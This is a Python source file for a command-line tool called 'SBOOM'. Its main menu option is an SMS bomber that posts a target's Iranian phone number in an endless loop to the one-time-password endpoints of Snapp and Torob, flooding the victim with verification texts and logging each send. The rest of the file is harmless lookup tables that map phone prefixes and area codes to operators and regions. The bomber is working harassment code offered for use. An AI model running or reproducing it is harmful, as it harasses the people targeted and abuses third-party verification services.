import time 
import datetime
import requests
import os
import getpass
import sys

def clear_screen():  #clear screen for  windows/linux/mac
    if os.name == "nt" :
        os.system("cls")
    else :
        os.system("clear")
        
def log_action(num , apiwork):
    if os.name == "nt":            #windows : c:/sboom/sboom-log.txt
        try :                      #linux : /home/username/sboom/sboom-log.txt
            os.chdir("c:/sboom")
        except OSError :
            os.chdir("c:/")
            os.mkdir("sboom")
            os.chdir("c:/sboom")
    else :
        linuxuser = getpass.getuser()
        try :
            os.chdir(f"/home/{linuxuser}/sboom")
        except FileNotFoundError :
            os.chdir(f"/home/{linuxuser}")
            os.mkdir("sboom")
            os.chdir(f"/home/{linuxuser}/sboom")
    
    file = open("sboom-log.txt" , "a")
    
    today = datetime.date.today()
    now = datetime.datetime.now()
    current_time = now.strftime("%H:%M:%S")
    
    file.write(f"{today} {current_time} Phone number <{num}> , Send message<{apiwork}>\n")
    file.close()
    
def bomber(num):
    while True :
        url = ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp")
        numb = {"cellphone":"+98"+num} 
        requests.post(url , data=numb)
        print ("+98" + num , ("Snapp"))
        e = datetime.datetime.now()
        print (" %s:%s:%s" % (e.hour, e.minute, e.second))
        print ("_________________________________")
        log_action(num , apiwork="Snapp")
        time.sleep(2)
        base_url = "https://api.torob.com/a/phone/send-pin/?phone_number="
        requests.get(f"{base_url}{num}")
        print ("+98" + num , "Torob")
        e = datetime.datetime.now()
        print (" %s:%s:%s" % (e.hour, e.minute, e.second))
        print ("_________________________________")
        log_action(num , apiwork="Torob")
        time.sleep(8)
 
def sim(code):
    try :
        operatorDate = {
            #irancell
            "0903":"Irancell" ,
            "0930":"Irancell" ,
            "0933":"Irancell" , 
            "0935":"Irancell" ,
            "0936":"Irancell" , 
            "0937":"Irancell" , 
            "0938":"Irancell" , 
            "0941":"Irancell" , 
            "0900":"Irancell" , 
            "0905":"Irancell" , 
            "0904":"Irancell" , 
            "0902":"Irancell" , 
            "0939":"Irancell" , 
            "0901":"Irancell" , 
            #Hamrah aval
            "0911":"Hamrah aval" ,
            "0912":"Hamrah aval" ,  
            "0913":"Hamrah aval" , 
            "0914":"Hamrah aval" , 
            "0915":"Hamrah aval" , 
            "0916":"Hamrah aval" , 
            "0917":"Hamrah aval" , 
            "0918":"Hamrah aval" , 
            "0994":"Hamrah aval - anarestan" , 
            #Rightel
            "0920":"Rightel" , 
            "0921":"Rightel" ,
            "0922":"Rightel" ,  
            #spadana
            "0931":"spadana Malaysia-Iran" ,  
            #telekish
            "0934768":"Telekish" ,  
            "0934769":"Telekish" ,  
            #samantel
            "09999":"Samantel" ,  
            "099999":"Samantel" ,  
            #shatel
            "0998":"Shatel" ,  
            #lotus-tel
            "0999":"Lotus tel-persian" ,
            #talia
            "0932":"Talia"
            }

        cityDate = {
            #Hamrah aval
            "0911":"For Golestan , Mazandaran , Gilan" ,
            "0912":"For Tehran , Alborz , Qom , Semnan , Zanjan , Qazvin" ,  
            "0913":"For Esfehan , Yazd , Kerman , Chahar mahal bakhtiari" , 
            "0914":"For Ardebil , Azarbaijan qarbi , Azarbaijan shrghi" , 
            "0915":"For Khorasan razavi , Khorasan shomali , Khorasan junoobi , Sistan va baluchestan" , 
            "0916":"For Khuzestan , Lorestan" , 
            "0917":"For Fars , Kohgelooye va boyrahmat , Hormozgan , Booshehr" , 
            "0918":"For Hamedan , Ilam , Markazi , Kordestan , Kermanshah" , 
            }
        
        global operatSimStat
        global citSimstat
        operatSimStat = (operatorDate[code])
        
        try :
                citSimstat = (cityDate[code])
        except KeyError :
                citSimstat = ("None")
    except KeyError or NameError :
        operatSimStat = ("Not found")
        citSimstat = ("None")

    
def land(code):
    try :  
        landingDate = {
            "041":"Azarbaijan sharqi" ,
            "044":"Azarbaijan qarbi" ,
            "031":"Esfehan" ,
            "045":"Ardebil" ,
            "084":"Ilam" ,
            "077":"booshehr" ,
            "021":"Tehran" ,
            "026":"Karaj" ,
            "038":"chahar mahal bakhtiari" ,
            "056":"khorasan junoobi" , 
            "051":"khorasan razavi" , 
            "058":"khorasan shomali" , 
            "061":"khuzestan" , 
            "024":"zanjan" , 
            "023":"semnan" , 
            "054":"sistan va baluchestn" ,
            "071":"fars" , 
            "028":"qazvin" , 
            "025":"qom" , 
            "087":"kordestan" , 
            "034":"kerman" , 
            "083":"kermanshah" , 
            "074":"kohqelooye va boyerahmad" , 
            "017":"Golestan" , 
            "013":"Gilan" , 
            "066":"Lorestan" , 
            "011":"mazandaran" , 
            "086":"markazi" , 
            "076":"hormozgan" , 
            "081":"hamedan" , 
            "035":"yazd" , 
        }
        global citLanstat 
        citLanstat = (landingDate[code])
    except KeyError :
        citLanstat = ("Not found")
        
    

while True :
    clear_screen()
    print("""
███████╗██████╗  ██████╗  ██████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔═══██╗██╔═══██╗████╗ ████║
███████╗██████╔╝██║   ██║██║   ██║██╔████╔██║
╚════██║██╔══██╗██║   ██║██║   ██║██║╚██╔╝██║
███████║██████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝""")
    print("=============================================")
    print("[1] - SMS bomber")
    print("[2] - Search by arey number")
    print("[3] - Search by arey landing code")
    print("[4] - SBOOM guid")
    print("[5] - Exit")
    print("=============================================")
    menu = input("Enter your choice >>>")

    if menu == ("1") or menu == ("one") or menu == ("bomber") :
        number = input("Enter targer number(+98)>>>")
        print ("_________________________________")
        bomber(number)
        
    elif menu == ("2") or menu == ("two") or menu == ("sim"):
        print("=============================================")
        number = input("Enter targer code >>>")
        sim(number)
        print(f"Operator : {operatSimStat} , City : {citSimstat}")
        input("Press enter for continue")
        clear_screen()
    elif menu == ("3") or menu ==   ("three") or menu == ("landing"):
        print("=============================================")
        number = input("Enter targer code >>>")
        land(number)
        print(f"City : {citLanstat}")
        input("Press enter for continue")
        clear_screen()
    elif menu == ("4") or menu == ("four") or menu == ("guid"):
        print("=========================================")
        print("Hello welcome to Sboom") 
        print("Contact us:")
        print("Github :https://github.com/mahdi-fyz")
        print("=========================================")
        print("● Sboom option :")
        print("-Save log file :")
        print(" |  linux :/home/yourusername/stool/stool-log.txt")
        print(" |  windows :c:/stool/stool-log.txt")
        input("Press enter for continue")
        clear_screen()
    elif menu == ("5") or menu == ("five") or menu == ("exit"):
        print("Exiting...")
        time.sleep(1)
        sys.exit()